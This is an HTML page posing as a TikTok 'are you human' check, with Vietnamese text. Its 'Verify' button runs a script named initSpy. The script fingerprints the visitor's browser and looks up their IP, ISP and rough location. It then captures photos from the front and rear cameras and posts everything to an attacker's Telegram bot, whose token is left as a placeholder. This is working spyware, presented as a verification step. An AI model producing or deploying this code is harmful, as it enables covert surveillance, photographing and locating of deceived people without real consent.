<!DOCTYPE html><html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    h1 {
      font-size: 1.5rem;
      margin-bottom: 1rem;
    }
    button {
      background: #fe2c55;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px 24px;
      font-size: 1rem;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Bạn có phải là con người không?</h1>
  <button onclick="initSpy()">Xác minh</button>  <script>
    const token = "<TELEGRAM_BOT_TOKEN>"; // <- thay bằng token thật
    const chatId = "<TELEGRAM_CHAT_ID>";  // <- thay bằng chat_id thật

    function sha256(str) {
      const buffer = new TextEncoder().encode(str);
      return crypto.subtle.digest('SHA-256', buffer).then(hash =>
        Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('')
      );
    }

    async function generateFingerprint() {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "16px Arial";
      ctx.fillText("fingerprint", 2, 2);
      const canvasHash = await sha256(canvas.toDataURL());
      const webglHash = await sha256(navigator.platform + navigator.vendor);

      const raw = [
        navigator.userAgent,
        navigator.language,
        Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen.width + "x" + screen.height,
        navigator.hardwareConcurrency,
        canvasHash,
        webglHash
      ].join("|");

      return sha256(raw);
    }

    async function getInfo() {
      const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
      const fp = await generateFingerprint();

      let isNew = true;
      let history = JSON.parse(localStorage.getItem("fp_history") || "[]");
      if (history.includes(fp)) isNew = false;
      else {
        history.push(fp);
        localStorage.setItem("fp_history", JSON.stringify(history));
      }

      const time = new Date();
      const msg = `\uD83D\uDCE1 [TH\u00D4NG TIN TRUY C\u1EACP]\n\n${isNew ? "\uD83C\uDD95 Thi\u1EBFt b\u1ECB m\u1EDBi" : "\u267B\uFE0F Thi\u1EBFt b\u1ECB \u0111\u00E3 truy c\u1EADp tr\u01B0\u1EDBc"}
\uD83D\uDD52 Th\u1EDDi gian: ${time.toLocaleTimeString()} ${time.toLocaleDateString()}
\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${navigator.userAgent}
\uD83D\uDCDA Fingerprint: ${fp}
\uD83C\uDF0D IP: ${ipData.ip || "Không xác định"}
\uD83C\uDFE2 ISP: ${ipData.org || "Không xác định"}
\uD83C\uDFE0 \u0110\u1ECBa ch\u1EC9: ${ipData.city || "-"}, ${ipData.region || "-"}, ${ipData.country_name || "-"}
\uD83C\uDF04 GPS: https://maps.google.com/?q=${ipData.latitude || 0},${ipData.longitude || 0}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      });
    }

    async function takePhoto(facingMode = "user") {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 800));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `cam_${facingMode}.jpg`);

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });

        stream.getTracks().forEach(track => track.stop());
      } catch (err) {
        console.warn("Không thể truy cập camera", err);
      }
    }

    async function initSpy() {
      await getInfo();
      await takePhoto("user");
      await takePhoto("environment");
    }
  </script></body>
</html>
